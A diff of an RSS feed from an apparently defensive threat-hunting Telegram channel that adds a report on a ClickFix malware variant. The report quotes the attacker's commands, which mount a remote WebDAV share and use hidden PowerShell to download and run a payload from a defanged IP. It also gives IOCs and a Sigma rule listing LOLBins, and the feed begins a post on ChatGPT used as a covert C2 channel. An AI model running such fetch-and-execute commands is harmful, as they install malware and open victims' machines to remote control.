@@ -1,10 +1,84 @@
 <?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Threat Hunting Father 🦔</title><link>https://t.me/ThreatHuntingFather</link><description>All about Threat Hunting, detecting malicious activity</description><language>ru</language><lastBuildDate>Tue, 17 Mar 2026 05:23:58 +0000</lastBuildDate><item><title>LOLEXFIL</title><link>https://t.me/ThreatHuntingFather/1231</link><description>LOLEXFIL
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Threat Hunting Father 🦔</title><link>https://t.me/ThreatHuntingFather</link><description>All about Threat Hunting, detecting malicious activity</description><language>ru</language><lastBuildDate>Tue, 17 Mar 2026 10:00:48 +0000</lastBuildDate><item><title>New Click-Fix Variant (Cloudflare Win + R)</title><link>https://t.me/ThreatHuntingFather/1232</link><description>New Click-Fix Variant (Cloudflare Win + R)
+Исследователи Atos зафиксировали новый вариант техники ClickFix, в котором злоумышленники убеждают пользователя выполнить вредоносную команду через диалог Win + R.
+В отличие от предыдущих итераций, где использовались PowerShell или MSHTA, здесь применяется net use для монтирования удалённого WebDAV-диска с последующим запуском .cmd скрипта с этого диска:
+cmd.exe /c net use Z: http://94.156.170[.]255/webdav /persistent:no
+&amp;&amp; "Z:\update.cmd" &amp; net use Z: /delete
+update.cmd запускает скрытый PowerShell, скачивает ZIP-архив и распаковывает его:
+powershell
+powershell -WindowStyle Hidden -Command
+"Invoke-WebRequest 'http://94.156.170[.]255/flowy.zip'
+-OutFile $env:TEMP\dl.zip;
+Expand-Archive $env:TEMP\dl.zip
+-DestinationPath $env:LOCALAPPDATA\MyApp -Force;
+Start-Process $env:LOCALAPPDATA\MyApp\WorkFlowy.exe"
+Архив содержит легитимное приложение WorkFlowy (Electron, v1.4.1050), подписанное разработчиком. Вредоносный код внедрён в main.js внутри app.asar - формата, который крайне редко проверяется средствами защиты.
+После запуска малварь:
+🔁 Каждые 2 секунды отправляет POST-запрос на C2 с именем машины, юзернеймом и уникальным victim ID
+💾 Сохраняет victim ID в %APPDATA%\id.txt для трекинга между сессиями
+📦 Получает и исполняет полезную нагрузку через child_process.exec из %TEMP%\[unix_timestamp]\
+C2: cloudflare[.]report/forever/e/
+Staging IP: 144[.]31[.]165[.]173 (Frankfurt, AS215439)
+🧬 IOCs: 94[.]156[.]170[.]255 • 144[.]31[.]165[.]173 • cloudflare[.]report • happyglamper[.]roa390fe045f50a0697b14160132dfa124c7f92d85c18fba07df351c2fcfc11063 (app.asar)
+🛡 Detection: Hunting Query
+title: Suspicious Commands executed via Run dialog
+id: 20891a30-032e-4f15-a282-fa4a8b0d8aae
+status: experimental
+description: Detects suspicious command interpreters and LOLBins written into the Explorer RunMRU registry key (commonly used for Run dialog history), with explorer.exe as the initiating process.
+author: TRC
+date: 2026-03-05
+tags:
+– attack.execution
+– attack.t1059
+– attack.defense_evasion
+logsource:
+category: registry_set
+product: windows
+definition: “Sysmon Event ID 13 (Registry value set) or equivalent EDR registry telemetry”
+detection:
+selection_key:
+TargetObject|contains:‘\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU’
+selection_proc:
+Image|endswith: ‘\explorer.exe’
+selection_data:
+Details|contains:
+– ‘cmd ‘
+– ‘powershell ‘
+– ‘cmd.exe ‘
+– ‘powershell.exe ‘
+– ‘wscript.exe ‘
+– ‘cscript.exe ‘
+– ‘net.exe ‘
+– ‘net1.exe ‘
+– ‘sh.exe ‘
+– ‘bash.exe ‘
+– ‘schtasks.exe ‘
+– ‘regsvr32.exe ‘
+– ‘hh.exe ‘
+– ‘wmic.exe ‘
+– ‘mshta.exe ‘
+– ‘rundll32.exe ‘
+– ‘msiexec.exe ‘
+– ‘forfiles.exe ‘
+– ‘scriptrunner.exe ‘
+– ‘mftrace.exe ‘
+– ‘AppVLP.exe ‘
+– ‘svchost.exe ‘
+– ‘msbuild.exe ‘
+condition: selection_key and selection_proc and selection_data
+falsepositives:
+– “Legitimate administrative activity using Run dialog (Win+R) to execute built-in tools.”
+– “IT scripts or troubleshooting steps executed interactively by a user.”
+level: medium
+🔗 https://atos.net/en/lp/cybershield/investigating-a-new-click-fix-variant
+🦔 THF
+
+[Media: Фото]</description><pubDate>Tue, 17 Mar 2026 08:09:47 +0000</pubDate><guid isPermaLink="false">telegram_ThreatHuntingFather_1232</guid></item><item><title>LOLEXFIL</title><link>https://t.me/ThreatHuntingFather/1231</link><description>LOLEXFIL
 Living off the land Data Exfiltration methods (189 trusted tools).
 
 [Media: Фото]</description><pubDate>Mon, 16 Mar 2026 14:03:57 +0000</pubDate><guid isPermaLink="false">telegram_ThreatHuntingFather_1231</guid></item><item><title>https://youtube.com/playlist?list=PLBKkldXXZQhD1hzCkhhMQXjEQ_qWnFtQn</title><link>https://t.me/ThreatHuntingFather/1230</link><description>https://youtube.com/playlist?list=PLBKkldXXZQhD1hzCkhhMQXjEQ_qWnFtQn</description><pubDate>Mon, 16 Mar 2026 05:27:57 +0000</pubDate><guid isPermaLink="false">telegram_ThreatHuntingFather_1230</guid></item><item><title>Message 1229</title><link>https://t.me/ThreatHuntingFather/1229</link><description>
 
-[Media: Видео]</description><pubDate>Tue, 17 Mar 2026 05:23:58 +0000</pubDate><guid isPermaLink="false">telegram_ThreatHuntingFather_1229</guid></item><item><title>ChatGPT as a Covert C2 Channel</title><link>https://t.me/ThreatHuntingFather/1220</link><description>ChatGPT as a Covert C2 Channel
+[Media: Видео]</description><pubDate>Tue, 17 Mar 2026 10:00:48 +0000</pubDate><guid isPermaLink="false">telegram_ThreatHuntingFather_1229</guid></item><item><title>ChatGPT as a Covert C2 Channel</title><link>https://t.me/ThreatHuntingFather/1220</link><description>ChatGPT as a Covert C2 Channel
 The Core Concept
 The idea was simple but elegant:
 Plant an agent on the target machine
